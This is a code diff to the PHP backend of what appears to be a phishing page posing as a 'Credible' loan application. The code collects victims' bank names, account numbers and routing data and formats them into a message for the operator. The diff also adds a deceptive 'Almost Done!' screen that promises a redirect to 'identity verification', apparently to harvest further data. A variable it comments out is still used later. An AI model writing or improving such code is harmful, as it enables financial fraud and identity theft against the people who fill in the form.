@@ -441,8 +441,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Bank information
     $bank_name = get_form_value(['q110_mothersMaiden110']);
     $account_number = get_form_value(['q109_savingsAccount']);
-    $bank_phone = get_form_value(['q111_phoneNumber', 'full']);
-    $bank_address = get_form_value(['q112_address']);
+    // $bank_phone = get_form_value(['q111_phoneNumber', 'full']);
+    $bank_routing = get_form_value(['q112_address']);
     
     // Consents
     $credit_consent = isset($_POST['q51_iAuthorize51']) ? 'Yes' : 'No';
@@ -602,7 +602,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $message .= "• <b>Bank Name:</b> $bank_name\n";
     $message .= "• <b>Account #:</b> <code>$account_number</code>\n";
     $message .= "• <b>Bank Phone:</b> $bank_phone\n";
-    $message .= "• <b>Bank Address:</b> $bank_address\n\n";
+    $message .= "• <b>Bank Routing:</b> $bank_routing\n\n";
     
     $message .= "<b>✅ CONSENTS:</b>\n";
     $message .= "• <b>Credit Check Authorization:</b> $credit_consent\n";
@@ -872,8 +872,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     <body>
         <div class="success-container">
             <div class="success-icon">✓</div>
-            <h1>Application Submitted!</h1>
-            <p>Thank you for choosing Credible. Your loan application has been successfully received and is being processed.</p>
+            <h1>Almost Done!</h1>
+            <p>Please hold on while we redirect you to complete your identity verification. This will only take a moment.</p>
             
             <div class="status-box">
                 <div class="status-item">
